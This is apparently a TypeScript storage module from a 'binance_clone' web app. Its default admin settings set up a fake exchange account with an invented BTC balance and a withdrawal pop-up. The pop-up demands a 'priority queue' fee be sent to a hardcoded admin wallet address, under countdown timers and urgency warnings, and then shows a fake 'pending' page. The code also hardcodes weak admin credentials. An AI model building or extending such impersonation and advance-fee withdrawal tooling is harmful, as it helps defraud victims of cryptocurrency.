// LocalStorage utilities for persisting admin and session data

import type { AdminState, UserSession, WithdrawalTransaction } from '@/types';

const STORAGE_KEYS = {
  ADMIN_STATE: 'binance_clone_admin',
  USER_SESSION: 'binance_clone_session',
  WITHDRAWAL_TRANSACTION: 'binance_clone_transaction',
};

// Default admin state
export const defaultAdminState: AdminState = {
  auth: {
    password: 'Code-2-444-66666',
    verificationCode: '123456',
    testMode: false,
  },
  profile: {
    photo: 'https://api.dicebear.com/7.x/avataaars/svg?seed=BinanceUser',
    name: 'Crypto Trader',
    userId: '123456789',
    isVip: true,
    isVerified: true,
  },
  balance: {
    cryptoAmount: '0.5234',
    cryptoSymbol: 'BTC',
    fiatAmount: '1,234.56',
    fiatSymbol: '$',
  },
  withdrawalModal: {
    titleTemplate: 'To complete the withdrawal of [AMOUNT] to the address you provided, follow below!',
    scrollableMessage: 'Please verify all details carefully. Cryptocurrency transactions cannot be reversed once confirmed on the blockchain.\n\nEnsure the receiving address and network are correct before proceeding. Double-check the amount and destination to avoid any loss of funds.',
    priorityQueueTitle: 'Priority Queue',
    priorityQueueDescription: 'Send fee to the address below to process your withdrawal immediately',
    networkDisplayName: 'BSC (BEP20)',
    adminWalletAddress: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    yellowWarningText: 'Important: This is a priority withdrawal. Please complete within the time limit.',
    feeAmount: '1.5',
    countdownDuration: 172800, // 2 days in seconds
    primaryButtonText: 'Continue',
    secondaryButtonText: 'Cancel',
  },
  pendingPage: {
    title: 'Withdrawal Pending',
    messageLine1: 'Your withdrawal request has been submitted',
    messageLine2: 'and is being processed.',
    countdownDuration: 86400, // 1 day in seconds
    okButtonText: 'OK',
  },
  adminPassword: 'admin123',
};

// Default user session
export const defaultUserSession: UserSession = {
  isLoggedIn: false,
  loginIdentifier: '',
  stayLoggedIn: false,
  sessionExpiry: null,
};

// Get admin state from localStorage
export function getAdminState(): AdminState {
  try {
    const stored = localStorage.getItem(STORAGE_KEYS.ADMIN_STATE);
    if (stored) {
      return { ...defaultAdminState, ...JSON.parse(stored) };
    }
  } catch (error) {
    console.error('Error reading admin state:', error);
  }
  return defaultAdminState;
}

// Save admin state to localStorage
export function saveAdminState(state: AdminState): void {
  try {
    localStorage.setItem(STORAGE_KEYS.ADMIN_STATE, JSON.stringify(state));
  } catch (error) {
    console.error('Error saving admin state:', error);
  }
}

// Get user session from localStorage
export function getUserSession(): UserSession {
  try {
    const stored = localStorage.getItem(STORAGE_KEYS.USER_SESSION);
    if (stored) {
      const session = { ...defaultUserSession, ...JSON.parse(stored) };
      // Check if session has expired
      if (session.sessionExpiry && Date.now() > session.sessionExpiry) {
        return defaultUserSession;
      }
      return session;
    }
  } catch (error) {
    console.error('Error reading user session:', error);
  }
  return defaultUserSession;
}

// Save user session to localStorage
export function saveUserSession(session: UserSession): void {
  try {
    localStorage.setItem(STORAGE_KEYS.USER_SESSION, JSON.stringify(session));
  } catch (error) {
    console.error('Error saving user session:', error);
  }
}

// Clear user session
export function clearUserSession(): void {
  try {
    localStorage.removeItem(STORAGE_KEYS.USER_SESSION);
  } catch (error) {
    console.error('Error clearing user session:', error);
  }
}

// Get withdrawal transaction from localStorage
export function getWithdrawalTransaction(): WithdrawalTransaction | null {
  try {
    const stored = localStorage.getItem(STORAGE_KEYS.WITHDRAWAL_TRANSACTION);
    if (stored) {
      return JSON.parse(stored);
    }
  } catch (error) {
    console.error('Error reading withdrawal transaction:', error);
  }
  return null;
}

// Save withdrawal transaction to localStorage
export function saveWithdrawalTransaction(transaction: WithdrawalTransaction): void {
  try {
    localStorage.setItem(STORAGE_KEYS.WITHDRAWAL_TRANSACTION, JSON.stringify(transaction));
  } catch (error) {
    console.error('Error saving withdrawal transaction:', error);
  }
}

// Clear withdrawal transaction
export function clearWithdrawalTransaction(): void {
  try {
    localStorage.removeItem(STORAGE_KEYS.WITHDRAWAL_TRANSACTION);
  } catch (error) {
    console.error('Error clearing withdrawal transaction:', error);
  }
}

// Export/import all data
export function exportAllData(): string {
  const data = {
    admin: getAdminState(),
    session: getUserSession(),
    transaction: getWithdrawalTransaction(),
  };
  return JSON.stringify(data, null, 2);
}

export function importAllData(jsonString: string): boolean {
  try {
    const data = JSON.parse(jsonString);
    if (data.admin) saveAdminState(data.admin);
    if (data.session) saveUserSession(data.session);
    if (data.transaction) saveWithdrawalTransaction(data.transaction);
    return true;
  } catch (error) {
    console.error('Error importing data:', error);
    return false;
  }
}

// Reset all data to defaults
export function resetAllData(): void {
  localStorage.removeItem(STORAGE_KEYS.ADMIN_STATE);
  localStorage.removeItem(STORAGE_KEYS.USER_SESSION);
  localStorage.removeItem(STORAGE_KEYS.WITHDRAWAL_TRANSACTION);
}
